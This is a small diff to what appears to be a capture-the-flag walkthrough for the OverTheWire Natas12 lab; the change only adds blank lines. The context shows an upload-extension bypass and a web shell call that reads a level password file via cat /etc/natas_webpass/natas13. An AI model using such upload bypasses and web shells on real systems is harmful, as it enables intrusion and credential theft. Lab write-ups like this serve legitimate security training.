@@ -113,6 +113,7 @@ Content-Type: application/x-php
 ------WebKitFormBoundaryeB3FX0A3xF2jnaGE--
 ```
 We can change `t0lxarz5b0.jpg` to `php` extension for example:
+
 **Result:**
 ```http
 HTTP/1.1 200 OK
@@ -167,6 +168,7 @@ As we previously know that the passwords are stored in `/etc/natas_webpass`, we'
 http://natas12.natas.labs.overthewire.org/upload/4r7pgo9trn.php?cmd=cat%20/etc/natas_webpass/natas13
 ```
 To get the password for Natas13 Level.
+
 **Result:**
 ```
 <PASSWORD>
